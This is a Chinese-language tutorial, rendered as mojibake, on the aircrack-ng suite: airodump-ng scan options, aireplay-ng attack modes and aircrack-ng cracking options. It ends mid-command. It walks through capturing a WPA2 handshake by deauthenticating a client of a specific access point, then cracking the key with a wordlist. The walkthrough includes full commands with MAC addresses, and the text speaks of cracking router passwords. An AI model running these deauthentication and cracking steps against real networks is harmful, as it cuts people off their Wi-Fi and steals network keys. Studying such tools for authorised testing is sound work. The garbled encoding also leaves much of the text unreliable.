(FIFOï¼Œé»˜è®¤å€¼)ã€1(è½®è¯¢)æˆ– 2(æœ€åä¸€è·³)ã€‚ </p><p>-2,â€“ht20ï¼šå°†é€šé“è®¾ç½®ä¸º HT20 (802.11n)ã€‚ </p><p>-3,â€“ht40+ï¼šè®¾ç½®é€šé“ä¸º HT40+ (802.11n)ã€‚å®ƒè¦æ±‚ 20MHz ä»¥ä¸Šçš„é¢‘ç‡æ˜¯å¯ç”¨çš„(4 é€šé“ä»¥ä¸Š)ï¼Œå› æ­¤ä¸€äº›é€šé“åœ¨ HT40+ä¸­æ˜¯ä¸å¯ç”¨çš„ã€‚HT40+åœ¨ç¾å›½åªæœ‰ 7 ä¸ªé¢‘é“å¯ç”¨(æ¬§æ´²å¤§éƒ¨åˆ†åœ°åŒºæœ‰9 ä¸ª)ã€‚ </p><p>-5,â€“ht40-ï¼šå°†é€šé“è®¾ç½®ä¸º HT40-(802.11n)ã€‚å®ƒè¦æ±‚ 20MHz ä»¥ä¸‹çš„é¢‘ç‡æ˜¯å¯ç”¨çš„(4 ä¸ªé€šé“æ˜¯ä½çš„)ï¼Œå› æ­¤ä¸€äº›é€šé“åœ¨ HT40-ä¸­æ˜¯ä¸å¯ç”¨çš„ã€‚åœ¨ 2.4GHz ä¸­ï¼ŒHT40 é€šé“ä» 5 é€šé“å¼€å§‹ã€‚ </p><p>-r &lt;file&gt;ï¼šä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®åŒ…ã€‚ </p><p>-x &lt;msecs&gt;ï¼šä¸»åŠ¨æ‰«ææ¨¡æ‹Ÿ(å‘é€æ¢æµ‹è¯·æ±‚å¹¶è§£ææ¢æµ‹å“åº”)ã€‚ </p><p>-M,â€“manufacturerï¼šæ˜¾ç¤ºä¸€ä¸ªåˆ¶é€ å•†åˆ—ï¼Œå…¶ä¸­åŒ…å«ä» IEEE OUI åˆ—è¡¨è·å¾—çš„ä¿¡æ¯ã€‚ </p><p>-U,â€“updateï¼šæ˜¾ç¤ºä»å…¶ä¿¡æ ‡æ—¶é—´æˆ³è·å¾—çš„ APs æ­£å¸¸è¿è¡Œæ—¶é—´ã€‚ </p><p>-W,â€“wpsï¼šæ˜¾ç¤º WPS åˆ—ï¼Œå…¶ä¸­åŒ…å« WPS ç‰ˆæœ¬ã€é…ç½®æ–¹æ³•ã€ä» APs ä¿¡æ ‡æˆ–æ¢é’ˆå“åº”(å¦‚æœæœ‰çš„è¯)è·å¾—çš„ AP è®¾ç½®é”å®šã€‚ </p><p>â€“output-format &lt;formats&gt;ï¼šå®šä¹‰è¦ä½¿ç”¨çš„æ ¼å¼(ç”¨é€—å·åˆ†éš”)ã€‚å¯èƒ½çš„å€¼æ˜¯:pcap, ivs, csv, gps, kismet, netxmlã€‚é»˜è®¤å€¼ä¸º:pcapã€csvã€kismetã€kismt -newcoreã€‚â€œpcapâ€æ˜¯ç”¨äºä»¥ pcap æ ¼å¼è®°å½•æ•è·çš„ï¼Œâ€œivsâ€æ˜¯ç”¨äº ivs æ ¼å¼çš„(å®ƒæ˜¯â€”ivs çš„å¿«æ·æ–¹å¼)ã€‚â€œcsvâ€å°†åˆ›å»ºä¸€ä¸ª airodump-ng csv æ–‡ä»¶ï¼Œâ€œkismetâ€å°†åˆ›å»ºä¸€ä¸ª kismet csv æ–‡ä»¶ï¼Œâ€œkismet-newcoreâ€å°†åˆ›å»ºä¸€ä¸ª kismet netxmlæ–‡ä»¶ã€‚â€œgpsâ€æ˜¯ gps çš„ç®€å†™ã€‚é™¤ ivs å’Œ pcap å¤–ï¼Œè¿™äº›å€¼å¯ä»¥åˆå¹¶ã€‚ </p><p>-I &lt;seconds&gt;,â€“write-interval &lt;seconds&gt;ï¼šè¾“å‡ºæ–‡ä»¶çš„å†™å…¥é—´éš”ä¸º CSV, Kismet CSV å’Œ Kismet NetXMLï¼Œä»¥ç§’ä¸ºå•ä½(æœ€å°‘ 1 ç§’)ã€‚é»˜è®¤:5 ç§’ã€‚æ³¨æ„ï¼Œé—´éš”å¤ªå°å¯èƒ½ä¼šå‡æ…¢ airodump-ngã€‚ </p><p>-K &lt;enable&gt;,â€“background &lt;enable&gt;ï¼šè¦†ç›–è‡ªåŠ¨åå°æ£€æµ‹ã€‚ä½¿ç”¨â€œ0â€å¼ºåˆ¶å‰å°è®¾ç½®ï¼Œä½¿ç”¨â€œ1â€å¼ºåˆ¶åå°è®¾ç½®ã€‚å®ƒä¸ä¼šä½¿ airodump-ng ä½œä¸ºå®ˆæŠ¤è¿›ç¨‹è¿è¡Œï¼Œå®ƒå°†è·³è¿‡åå°è‡ªåŠ¨æ£€æµ‹å’Œå¼ºåˆ¶å¯ç”¨&#x2F;ç¦ç”¨äº¤äº’æ¨¡å¼å’Œæ˜¾ç¤ºæ›´æ–°ã€‚ </p><p>â€“ignore-negative-oneï¼šåˆ é™¤â€œå›ºå®šé€šé“&lt;æ¥å£&gt;:-1â€çš„æ¶ˆæ¯ </p><p>Filter options: è¿‡æ»¤é€‰é¡¹ï¼š </p><p>-t &lt;OPN|WEP|WPA|WPA1|WPA2&gt;,â€“encrypt &lt;OPN|WEP|WPA|WPA1|WPA2&gt;ï¼šå°†åªæ˜¾ç¤ºä¸ç»™å®šåŠ å¯†åŒ¹é…çš„ç½‘ç»œã€‚å¯ä»¥å¤šæ¬¡æŒ‡å®š:â€™-t OPN -t WPA2â€™ </p><p>-d &lt;bssid&gt;,â€“bssid &lt;bssid&gt;ï¼šå°†åªæ˜¾ç¤ºä¸ç»™å®š bssid åŒ¹é…çš„ç½‘ç»œã€‚ </p><p>-m &lt;mask&gt;,â€“netmask &lt;mask&gt;ï¼šå°†åªæ˜¾ç¤ºç½‘ç»œï¼ŒåŒ¹é…ç»™å®šçš„ bssid ^ç½‘æ©ç ç»„åˆã€‚éœ€è¦â€“bssid(æˆ–-d)éœ€è¦æŒ‡å®šã€‚ </p><p>-aï¼šåªæ˜¾ç¤ºå…³è”çš„å®¢æˆ·ç«¯ã€‚ </p><p>-N,â€“essidï¼šé€šè¿‡ ESSID è¿‡æ»¤ APsã€‚å¯ä»¥å¤šæ¬¡ä½¿ç”¨ä»¥åŒ¹é…ä¸€ç»„ ESSIDã€‚ </p><p>-R,â€“essid-regexï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼é€šè¿‡ ESSID è¿‡æ»¤ APsã€‚ </p><h4 id="2ã€ä½¿ç”¨ç¤ºä¾‹-1"><a href="#2ã€ä½¿ç”¨ç¤ºä¾‹-1" class="headerlink" title="2ã€ä½¿ç”¨ç¤ºä¾‹"></a>2ã€ä½¿ç”¨ç¤ºä¾‹</h4><p>ï¼ˆ1ï¼‰åªæ˜¾ç¤º ivs ä¿¡æ¯ï¼Œä¸ä¿å­˜æ‰«ææ–‡ä»¶</p><p>airodump-ng -i wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps53.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps53.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>1.BSSIDâ€“æ— çº¿APï¼ˆè·¯ç”±å™¨ï¼‰çš„MACåœ°å€ï¼Œå¦‚æœä½ æƒ³PJå“ªä¸ªè·¯ç”±å™¨çš„å¯†ç å°±æŠŠè¿™ä¸ªä¿¡æ¯è®°ä¸‹æ¥å¤‡ç”¨ã€‚<br>2.PWRâ€“è¿™ä¸ªå€¼çš„å¤§å°ååº”ä¿¡å·çš„å¼ºå¼±ï¼Œè¶Šå¤§è¶Šå¥½ã€‚å¾ˆé‡è¦ï¼ï¼ï¼<br>3.RXQâ€“ä¸¢åŒ…ç‡ï¼Œè¶Šå°è¶Šå¥½ï¼Œæ­¤å€¼å¯¹PJå¯†ç å½±å“ä¸å¤§ï¼Œä¸å¿…è¿‡äºå…³æ³¨ã€<br>4.Beaconsâ€“å‡†ç¡®çš„å«ä¹‰å¿˜è®°äº†ï¼Œå¤§è‡´å°±æ˜¯ååº”å®¢æˆ·ç«¯å’ŒAPçš„æ•°æ®äº¤æ¢æƒ…å†µï¼Œé€šå¸¸æ­¤å€¼ä¸æ–­å˜åŒ–ã€‚<br>5.#Dataâ€“è¿™ä¸ªå€¼éå¸¸é‡è¦ï¼Œç›´æ¥å½±å“åˆ°å¯†ç PJçš„æ—¶é—´é•¿çŸ­ï¼Œå¦‚æœæœ‰ç”¨æˆ·æ­£åœ¨ä¸‹è½½æ–‡ä»¶æˆ–çœ‹ç”µå½±ç­‰å¤§é‡æ•°æ®ä¼ è¾“çš„è¯ï¼Œæ­¤å€¼å¢é•¿è¾ƒå¿«ã€‚<br>6.CHâ€“å·¥ä½œé¢‘é“ã€‚<br>7.MBâ€“è¿æ¥é€Ÿåº¦<br>8.ENCâ€“ç¼–ç æ–¹å¼ã€‚é€šå¸¸æœ‰WEPã€WPAã€TKIPç­‰æ–¹å¼ï¼Œæœ¬æ–‡æ‰€ä»‹ç»çš„æ–¹æ³•åœ¨WEPä¸‹æµ‹è¯•100%æˆåŠŸï¼Œå…¶ä½™æ–¹å¼æœ¬äºº å¹¶æœªéªŒè¯ã€‚<br>9.ESSIDâ€“å¯ä»¥ç®€å•çš„ç†è§£ä¸ºå±€åŸŸç½‘çš„åç§°ï¼Œå°±æ˜¯é€šå¸¸æˆ‘ä»¬åœ¨æœç´¢æ— çº¿ç½‘ç»œæ—¶çœ‹åˆ°çš„åˆ—è¡¨é‡Œé¢çš„å„ä¸ªç½‘ç»œçš„åç§°</p><p>ï¼ˆ2ï¼‰ä»¥ ivs æ ¼å¼ä¿å­˜æ‰«ææ–‡ä»¶ä¸º test</p><p>airodump-ng -i -w test wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps54.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps54.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps55.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps55.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ3ï¼‰è·å–ä½ç½®ä¿¡æ¯</p><p>airodump-ng -g wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps56.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps56.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ4ï¼‰æ‰«ææŒ‡å®šä¿¡é“</p><p>airodump-ng -c 6 wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps57.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps57.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ5ï¼‰å°†æ‰«æåˆ°æŒ‡å®šä¿¡é“çš„ä¿¡æ¯åŒ…å«ä½ç½®ä¿¡æ¯ä¿å­˜åˆ°æ–‡ä»¶ test ä¸­ï¼Œå°†ç”Ÿæˆ 6 ä¸ªæ–°æ–‡ä»¶</p><p>airodump-ng -c 6 -w test -g wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps58.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps58.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps59.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps59.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps60.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps60.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ6ï¼‰å°†æ‰«æåˆ°æŒ‡å®šä¿¡é“çš„ä¿¡æ¯åŒ…å«ä½ç½®ä¿¡æ¯ä¿å­˜åˆ°æ–‡ä»¶ test ä¸­ï¼Œå¹¶æŒ‡å®šè¾“å‡ºæ ¼å¼ä¸º pcapï¼Œå°†ç”Ÿæˆä¸¤ä¸ªæ–°æ–‡ä»¶</p><p>airodump-ng -c 6 -w test -g â€“output-format pcap wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps61.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps61.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps62.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps62.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><h3 id="ï¼ˆå››ï¼‰-Aireplay-ng"><a href="#ï¼ˆå››ï¼‰-Aireplay-ng" class="headerlink" title="ï¼ˆå››ï¼‰ Aireplay-ng"></a>ï¼ˆå››ï¼‰ Aireplay-ng</h3><p>Aireplay-ng ç”¨äºæ³¨å…¥å¸§ã€‚ä¸»è¦åŠŸèƒ½æ˜¯äº§ç”Ÿæµé‡åœ¨ä»¥åä½¿ç”¨äº† Aircrack-ngçš„ç”¨äºè£‚åŒ– WEP å’Œ WPA-PSK çš„å¯†é’¥ã€‚ä¸ºäº†æ•è· WPA æ¡æ‰‹æ•°æ®ï¼Œä¼ªé€ çš„èº«ä»½éªŒè¯ï¼Œäº¤äº’å¼æ•°æ®åŒ…é‡æ’­ï¼Œæ‰‹å·¥åˆ¶ä½œçš„ ARP è¯·æ±‚æ³¨å…¥å’Œ ARP è¯·æ±‚é‡æ–°æ³¨å…¥ï¼Œæœ‰å¤šç§æ”»å‡»å¯èƒ½ä¼šå¯¼è‡´å–æ¶ˆè®¤è¯ã€‚ </p><h4 id="1ã€è¯­æ³•æ ¼å¼-2"><a href="#1ã€è¯­æ³•æ ¼å¼-2" class="headerlink" title="1ã€è¯­æ³•æ ¼å¼"></a>1ã€è¯­æ³•æ ¼å¼</h4><p>ã€è¯­æ³•ã€‘aireplay-ng &lt;options&gt; &lt;replay interface&gt; </p><p><em><strong>*è¿‡æ»¤å™¨é€‰é¡¹ï¼š*</strong></em> </p><p>-b bssidï¼šMAC åœ°å€ï¼Œè®¿é—®ç‚¹ </p><p>-d dmacï¼šMAC åœ°å€ï¼Œç›®æ ‡ </p><p>-s smacï¼šMAC åœ°å€ï¼Œæº </p><p>-m lenï¼šæœ€å°æ•°æ®åŒ…é•¿åº¦ </p><p>-n lenï¼šæœ€å¤§æ•°æ®åŒ…é•¿åº¦ </p><p>-u typeï¼šå¸§æ§åˆ¶ï¼Œç±»å‹å­—æ®µ </p><p>-v subtï¼šå¸§æ§åˆ¶ï¼Œå­ç±»å‹å­—æ®µ </p><p>-t todsï¼šå¸§æ§åˆ¶ï¼Œè‡³ DS ä½ </p><p>-f fromdsï¼šå¸§æ§åˆ¶ï¼Œä» DS ä½å¼€å§‹ </p><p>-w iswepï¼šå¸§æ§åˆ¶ï¼ŒWEP ä½ </p><p>å¯¹äºé™¤èº«ä»½éªŒè¯å’Œä¼ªèº«ä»½éªŒè¯ä»¥å¤–çš„æ‰€æœ‰æ”»å‡»ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¿‡æ»¤å™¨æ¥é™åˆ¶å°†å“ªäº›æ•°æ®åŒ…å‘ˆç°ç»™ç‰¹å®šæ”»å‡»ã€‚æœ€å¸¸ç”¨çš„è¿‡æ»¤å™¨é€‰é¡¹æ˜¯ â€œ-bâ€ï¼Œç”¨äºé€‰æ‹©ç‰¹å®šçš„æ¥å…¥ç‚¹ã€‚å¯¹äºå…¸å‹ç”¨æ³•ï¼Œâ€œ-bâ€æ˜¯æ‚¨å”¯ä¸€ä½¿ç”¨çš„ä¸€ä¸ªã€‚ </p><p><em><strong>*é‡æ’­é€‰é¡¹ï¼š*</strong></em> </p><p>-x nbppsï¼šæ¯ç§’çš„æ•°æ®åŒ…æ•° </p><p>-p fctrlï¼šè®¾ç½®å¸§æ§åˆ¶å­—ï¼ˆåå…­è¿›åˆ¶ï¼‰ </p><p>-a bssidï¼šè®¾ç½®æ¥å…¥ç‚¹ MAC åœ°å€ </p><p>-c dmacï¼šè®¾ç½®ç›®æ ‡ MAC åœ°å€ </p><p>-h smacï¼šè®¾ç½®æº MAC åœ°å€ </p><p>-e essidï¼šå¯¹äº fakeauth æ”»å‡»æˆ–æ³¨å…¥æµ‹è¯•ï¼Œå®ƒè®¾ç½®ç›®æ ‡ AP SSIDã€‚å½“æœªéšè— SSID æ—¶ï¼Œè¿™æ˜¯å¯é€‰çš„ã€‚ </p><p>-jï¼šarpreplay æ”»å‡»ï¼šæ³¨å…¥ FromDS pkts </p><p>-g valueï¼šæ›´æ”¹ç¯å½¢ç¼“å†²åŒºçš„å¤§å°ï¼ˆé»˜è®¤å€¼ï¼š8ï¼‰-k IPï¼šåœ¨ç‰‡æ®µä¸­è®¾ç½®ç›®æ ‡ IP </p><p>-l IPï¼šåœ¨ç‰‡æ®µä¸­è®¾ç½®æº IP </p><p>-o npcktsï¼šæ¯ä¸ªçªå‘çš„åŒ…æ•°ï¼ˆ-1ï¼‰ </p><p>-q secï¼šä¿æŒæ´»åŠ¨ä¹‹é—´çš„ç§’æ•°ï¼ˆ-1ï¼‰ </p><p>-y prgaï¼šå…±äº«å¯†é’¥éªŒè¯çš„å¯†é’¥æµ </p><p>-B æˆ– -bittestï¼šæ¯”ç‰¹ç‡æµ‹è¯•ï¼ˆä»…é€‚ç”¨äºæµ‹è¯•æ¨¡å¼ï¼‰ </p><p>-Dï¼šç¦ç”¨ AP æ£€æµ‹ã€‚å¦‚æœæœªå¬åˆ° AP ä¿¡æ ‡ï¼Œåˆ™æŸäº›æ¨¡å¼å°†æ— æ³•ç»§ç»­ã€‚è¿™å°†ç¦ç”¨æ­¤åŠŸèƒ½ã€‚ </p><p>-F æˆ– -fastï¼šé€‰æ‹©ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ•°æ®åŒ…ã€‚å¯¹äºæµ‹è¯•æ¨¡å¼ï¼Œå®ƒä»…æ£€æŸ¥åŸºæœ¬æ³¨å…¥å¹¶è·³è¿‡æ‰€æœ‰å…¶ä»–æµ‹è¯•ã€‚ </p><p>-R ç¦ç”¨ &#x2F;dev&#x2F;rtc ä½¿ç”¨ã€‚ä¸€äº›ç³»ç»Ÿé‡åˆ° RTC çš„é”å®šæˆ–å…¶ä»–é—®é¢˜ã€‚è¿™å°†ç¦ç”¨ç”¨æ³•ã€‚ </p><p><em><strong>*æ¥æºé€‰é¡¹ï¼š*</strong></em> </p><p>ifaceï¼šä»æ­¤æ¥å£æ•è·æ•°æ®åŒ… </p><p>-r æ–‡ä»¶ï¼šä»è¯¥ pcap æ–‡ä»¶ä¸­æå–æ•°æ®åŒ… </p><p>****æ”»å‡»æ–¹å¼****ï¼ˆä»ç„¶å¯ä»¥ä½¿ç”¨æ•°å­—ï¼‰ï¼š </p><p>â€“deauth countï¼šå–æ¶ˆå¯¹ 1 ä¸ªæˆ–æ‰€æœ‰å·¥ä½œç«™çš„è®¤è¯ï¼ˆ-0ï¼‰ </p><p>â€“fakeauth å»¶è¿Ÿï¼šä¸ AP çš„ä¼ªè®¤è¯ï¼ˆ-1ï¼‰ </p><p>â€“interactiveï¼šäº¤äº’å¼å¸§é€‰æ‹©ï¼ˆ-2ï¼‰ </p><p>â€“arpreplayï¼šæ ‡å‡† ARP è¯·æ±‚é‡æ’­ï¼ˆ-3ï¼‰ </p><p>â€“chopchopï¼šè§£å¯† &#x2F; æ–©æ³¢ WEP æ•°æ®åŒ…ï¼ˆ-4ï¼‰ </p><p>â€“fragmentï¼šç”Ÿæˆæœ‰æ•ˆçš„å¯†é’¥æµï¼ˆ-5ï¼‰ </p><h4 id="2ã€ä½¿ç”¨ç¤ºä¾‹-2"><a href="#2ã€ä½¿ç”¨ç¤ºä¾‹-2" class="headerlink" title="2ã€ä½¿ç”¨ç¤ºä¾‹"></a>2ã€ä½¿ç”¨ç¤ºä¾‹</h4><p><strong>è·å–æ¡æ‰‹åŒ…</strong></p><p>airodump-ng â€“bssid [ç›®æ ‡wifimac] -c [ç›®æ ‡wifiä¿¡é“] -w [ä¿å­˜çš„æ–‡ä»¶å] wlan0mon</p><p>è¿™é‡Œ-cæŒ‡å®šçš„æ‰«æä¿¡é“å°±æ˜¯åç»­æ”»å‡»çš„ä¿¡é“</p><p>æ³¨æ„!!!è¿™é‡Œä¸€å®šè¦ä¸å¯¹æ–¹wifiä¿¡é“ç›¸åŒå¦åˆ™æŠ“ä¸åˆ°æ¡æ‰‹åŒ…,ä¹Ÿæ”»å‡»ä¸äº†</p><p>é‡æ–°æ‰«æä¸€éï¼šç”±äºæ˜¯å¼€çš„ä¸ªäººçƒ­ç‚¹è¿›è¡Œæ”»å‡»ï¼Œæ‰€ä»¥æŒ‡å®šåè®®ä¸ºWAP2</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps63.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps63.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps64.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps64.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ç„¶ååœ¨ä¸Šé¢å‘½ä»¤è¿è¡Œçš„åŒæ—¶ï¼Œå†å¼€ä¸€ä¸ªç»ˆç«¯è¿›è¡Œæ”»å‡»ï¼š</p><p>aireplay-ng -0 5 -a 8A:99:70:05:47:05 -c 7C:B2:7D:64:49:FC wlan0mon</p><p>è·å–åˆ°äº†æ¡æ‰‹åŒ…WPA handshake 8A:99:70:05:47:05</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps65.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps65.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>è§£é‡Šï¼š-0ä¸ºæ¨¡å¼ä¸­çš„ä¸€ç§ï¼šå†²çªæ”»å‡»æ¨¡å¼ï¼Œåé¢è·Ÿå‘é€æ¬¡æ•°ï¼ˆè®¾ç½®ä¸º0ï¼Œåˆ™ä¸ºå¾ªç¯æ”»å‡»ï¼Œä¸åœçš„æ–­å¼€è¿æ¥ï¼Œå®¢æˆ·ç«¯æ— æ³•æ­£å¸¸ä¸Šç½‘ï¼Œ-a æŒ‡å®šæ— çº¿APçš„macåœ°å€ï¼Œå³ä¸ºè¯¥æ— çº¿ç½‘çš„bssidå€¼ï¼Œä¸Šå›¾å¯ä»¥ä¸€ç›®äº†ç„¶ã€‚</p><p>-0ï¼šå–æ¶ˆè®¤è¯æ”»å‡» </p><p>1ï¼šæ”»å‡» 1 æ¬¡ </p><p>-aï¼šè¦æ”»å‡»çš„ AP MAC åœ°å€ </p><p>-cï¼šå®¢æˆ·ç«¯çš„ MAC åœ°å€ </p><p>Wlan0monï¼šä½¿ç”¨çš„æ¥å£</p><h3 id="ï¼ˆäº”ï¼‰-Aircrack-ng"><a href="#ï¼ˆäº”ï¼‰-Aircrack-ng" class="headerlink" title="ï¼ˆäº”ï¼‰ Aircrack-ng"></a>ï¼ˆäº”ï¼‰ Aircrack-ng</h3><p>Aircrack-ng æ˜¯ 802.11 WEP å’Œ WPA &#x2F; WPA2-PSK å¯† é’¥ ç ´ è§£ ç¨‹ åº ã€‚ ä¸€ æ—¦ä½¿ç”¨airodump-ng æ•è·äº†è¶³å¤Ÿçš„åŠ å¯†æ•°æ®åŒ…ï¼ŒAircrack-ng å³å¯æ¢å¤ WEP å¯†é’¥ã€‚ä¸ºäº†ç ´è§£ WPA &#x2F; WPA2 é¢„å…±äº«å¯†é’¥ï¼Œä»…ä½¿ç”¨å­—å…¸æ–¹æ³•ã€‚ </p><h4 id="1ã€è¯­æ³•æ ¼å¼-3"><a href="#1ã€è¯­æ³•æ ¼å¼-3" class="headerlink" title="1ã€è¯­æ³•æ ¼å¼"></a>1ã€è¯­æ³•æ ¼å¼</h4><p>ã€è¯­æ³•ã€‘aircrack-ng [options] &lt;capture file(s)&gt; </p><p><em><strong>*å¸¸ç”¨é€‰é¡¹ï¼š*</strong></em> </p><p>-a amodeï¼šå¼ºåˆ¶æ”»å‡»æ¨¡å¼ï¼ˆ1 &#x3D; é™æ€ WEPï¼Œ2 &#x3D; WPA &#x2F; WPA2-PSKï¼‰ </p><p>-e essidï¼šå¦‚æœè®¾ç½®ï¼Œå°†ä½¿ç”¨æ¥è‡ªå…·æœ‰ç›¸åŒ ESSID çš„ç½‘ç»œçš„æ‰€æœ‰ IVã€‚å¦‚æœæœªå¹¿æ’­ ESSID ï¼ˆéšè—ï¼‰ï¼Œåˆ™ WPA &#x2F; WPA2-PSK ç ´è§£ä¹Ÿéœ€è¦æ­¤é€‰é¡¹ã€‚ </p><p>-b bssidï¼šé•¿ç‰ˆâ€“bssidã€‚æ ¹æ®æ¥å…¥ç‚¹çš„ MAC åœ°å€é€‰æ‹©ç›®æ ‡ç½‘ç»œ </p><p>-p nbcpuï¼šåœ¨ SMP ç³»ç»Ÿä¸Šï¼šè¦ä½¿ç”¨çš„ CPU æ•°é‡ã€‚æ­¤é€‰é¡¹åœ¨é SMP ç³»ç»Ÿä¸Šæ— æ•ˆ </p><p>-q noneï¼šå¯ç”¨å®‰é™æ¨¡å¼ï¼ˆåœ¨æ²¡æœ‰æ‰¾åˆ°å¯†é’¥ä¹‹å‰ä¸è¾“å‡ºçŠ¶æ€ï¼‰ </p><p>-C MACsï¼šé•¿ç‰ˆâ€“combineã€‚å°†ç»™å®šçš„ APï¼ˆä»¥é€—å·åˆ†éš”ï¼‰åˆå¹¶ä¸ºè™šæ‹Ÿ AP </p><p>-l file nameï¼šï¼ˆå°å†™ Lï¼Œellï¼‰å°†å¯†é’¥è®°å½•åˆ°æŒ‡å®šçš„æ–‡ä»¶ã€‚è¦†ç›–æ–‡ä»¶ï¼ˆå¦‚æœå·²å­˜åœ¨ï¼‰ </p><p><em><strong>*WEP å’Œ WPA-PSK ç ´è§£é€‰é¡¹ï¼š*</strong></em> </p><p>-w wordsï¼šå•è¯åˆ—è¡¨æˆ–â€œ-â€çš„è·¯å¾„ï¼Œç”¨é€—å·åˆ†éš”å¤šä¸ªå•è¯è¡¨ </p><p>-N fileï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç ´è§£ä¼šè¯å¹¶å°†å…¶ä¿å­˜åˆ°æŒ‡å®šçš„æ–‡ä»¶ </p><p>-R fileï¼šä»æŒ‡å®šæ–‡ä»¶è¿˜åŸç ´è§£ä¼šè¯ </p><p><em><strong>*WPA-PSK é€‰é¡¹ï¼š*</strong></em> </p><p>-E fileï¼š åˆ›å»º EWSA é¡¹ç›®æ–‡ä»¶ v3 </p><p>-j fileï¼šåˆ›å»º Hashcat v3.6 + Capture æ–‡ä»¶ï¼ˆHCCAPXï¼‰ </p><p>-J fileï¼šåˆ›å»º Hashcat Capture æ–‡ä»¶ </p><p>-S noneï¼šWPA ç ´è§£é€Ÿåº¦æµ‹è¯• </p><p>-Z secï¼šWPA ç ´è§£é€Ÿåº¦æµ‹è¯•æ‰§è¡Œæ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½ </p><p>-r databaseï¼šåˆ©ç”¨ airolib-ng ç”Ÿæˆçš„æ•°æ®åº“ä½œä¸ºè¾“å…¥æ¥ç¡®å®š WPA å¯†é’¥ã€‚å¦‚æœ aircrack-ng å°šæœªä½¿ç”¨ sqlite æ”¯æŒè¿›è¡Œç¼–è¯‘ï¼Œåˆ™è¾“å‡ºé”™è¯¯æ¶ˆæ¯ </p><h4 id="2ã€ä½¿ç”¨ç¤ºä¾‹-3"><a href="#2ã€ä½¿ç”¨ç¤ºä¾‹-3" class="headerlink" title="2ã€ä½¿ç”¨ç¤ºä¾‹"></a>2ã€ä½¿ç”¨ç¤ºä¾‹</h4><p>ä½¿ç”¨å­—å…¸ wordlist.txt ç ´è§£ hack-02.cap æ¡æ‰‹åŒ…å¯¹åº” AP çš„å¯†ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps66.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps66.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>è¿™æ˜¯ä¸Šä¸€æ­¥æŠ“åˆ°çš„æ¡æ‰‹åŒ…ï¼Œæ–°å»ºä¸€ä¸ªwordlist.textè¿›è¡Œæ”»å‡»ï¼š</p><p>aircrack-ng -w 